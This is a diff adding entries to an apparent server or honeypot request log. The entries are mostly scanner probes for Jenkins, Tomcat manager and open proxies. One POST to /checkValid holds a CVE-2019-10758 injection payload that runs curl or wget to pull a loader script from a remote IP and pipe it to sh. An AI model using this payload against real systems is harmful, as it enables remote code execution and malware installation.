@@ -1351,3 +1351,26 @@ GET / -  {}
 GET / -  {}
 GET / -  {}
 GET / -  {}
+GET / -  {}
+GET / -  {}
+GET http://passport.baidu.com/ -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
+GET http://passport.baidu.com/ -  {}
+GET / -  {}
+GET /checkValid -  {}
+POST /checkValid -  {
+  document: 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("(curl --user-agent cve_2019_10758 http://194.145.227.21/ldr.sh||wget --user-agent cve_2019_10758 -q -O - http://194.145.227.21/ldr.sh)|sh")'
+}
+GET /login -  {}
+GET /jenkins/login -  {}
+GET / -  {}
+GET /manager/html -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
